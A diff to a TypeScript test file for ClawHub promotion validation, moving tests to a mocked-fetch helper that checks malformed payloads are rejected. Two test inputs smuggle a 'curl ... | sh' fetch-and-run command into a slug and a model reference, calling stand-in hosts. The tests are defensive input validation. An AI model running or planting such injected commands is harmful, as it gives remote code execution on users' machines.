@@ -4,7 +4,6 @@ import {
   fetchClawHubPromotion,
   fetchClawHubPromotions,
   fetchClawHubPromotionsFeed,
-  parseClawHubPromotion,
   parseClawHubPromotionsFeed,
 } from "./clawhub.js";
 
@@ -25,65 +24,50 @@ const validPromotion = {
   signupUrl: "https://signup.example.com",
 };
 
-describe("parseClawHubPromotion", () => {
-  it("parses a full promotion payload", () => {
-    const parsed = parseClawHubPromotion({
-      ...validPromotion,
-      pluginNames: ["@openclaw/openrouter-provider"],
+describe("promotion payload validation", () => {
+  async function expectPromotionRejected(
+    overrides: Record<string, unknown>,
+    expected: RegExp,
+  ): Promise<void> {
+    mockHttp.intercept({
+      url: `${CLAWHUB_URL}/api/v1/promotions/spring-models`,
+      reply: { json: { ...validPromotion, ...overrides } },
     });
-    expect(parsed.slug).toBe("spring-models");
-    expect(parsed.models[0]?.suggestedDefault).toBe(true);
-    expect(parsed.pluginNames).toEqual(["@openclaw/openrouter-provider"]);
+    await expect(fetchClawHubPromotion({ slug: "spring-models" })).rejects.toThrow(expected);
+  }
+
+  it("rejects payloads without models", async () => {
+    await expectPromotionRejected({ models: [] }, /models/);
   });
 
-  it("rejects payloads without models", () => {
-    expect(() => parseClawHubPromotion({ ...validPromotion, models: [] })).toThrow(/models/);
+  it("rejects slugs outside ClawHub's slug contract", async () => {
+    await expectPromotionRejected({ slug: "deal; curl evil.sh|sh" }, /slug/);
   });
 
-  it("rejects slugs outside ClawHub's slug contract", () => {
-    // Slugs are echoed into copy-paste commands; shell metacharacters must fail parsing.
-    expect(() =>
-      parseClawHubPromotion({ ...validPromotion, slug: "deal; curl evil.sh|sh" }),
-    ).toThrow(/slug/);
-    expect(() => parseClawHubPromotion({ ...validPromotion, slug: "UPPER-case" })).toThrow(/slug/);
-  });
-
-  it("rejects model refs with shell metacharacters", () => {
-    expect(() =>
-      parseClawHubPromotion({
-        ...validPromotion,
-        models: [{ modelRef: "openrouter/foo; curl https://evil.example/sh | sh" }],
-      }),
-    ).toThrow(/unsupported characters/);
-  });
-
-  it("rejects non-string model refs", () => {
-    expect(() => parseClawHubPromotion({ ...validPromotion, models: [{ modelRef: 42 }] })).toThrow(
-      /modelRef/,
+  it("rejects model refs with shell metacharacters", async () => {
+    await expectPromotionRejected(
+      { models: [{ modelRef: "openrouter/foo; curl https://evil.example/sh | sh" }] },
+      /unsupported characters/,
     );
   });
 
-  it("rejects non-numeric windows", () => {
-    expect(() => parseClawHubPromotion({ ...validPromotion, endsAt: "soon" })).toThrow(/endsAt/);
+  it("rejects non-string model refs", async () => {
+    await expectPromotionRejected({ models: [{ modelRef: 42 }] }, /modelRef/);
   });
 
-  it("rejects inverted promotion windows", () => {
-    expect(() =>
-      parseClawHubPromotion({
-        ...validPromotion,
-        startsAt: 200,
-        endsAt: 200,
-      }),
-    ).toThrow(/window/);
+  it("rejects non-numeric windows", async () => {
+    await expectPromotionRejected({ endsAt: "soon" }, /endsAt/);
   });
 
-  it("rejects plugin values that are not package names", () => {
-    expect(() =>
-      parseClawHubPromotion({
-        ...validPromotion,
-        pluginNames: ["@openclaw/openrouter-provider@latest"],
-      }),
-    ).toThrow(/pluginNames/);
+  it("rejects inverted promotion windows", async () => {
+    await expectPromotionRejected({ startsAt: 200, endsAt: 200 }, /window/);
+  });
+
+  it("rejects plugin values that are not package names", async () => {
+    await expectPromotionRejected(
+      { pluginNames: ["@openclaw/openrouter-provider@latest"] },
+      /pluginNames/,
+    );
   });
 });
 
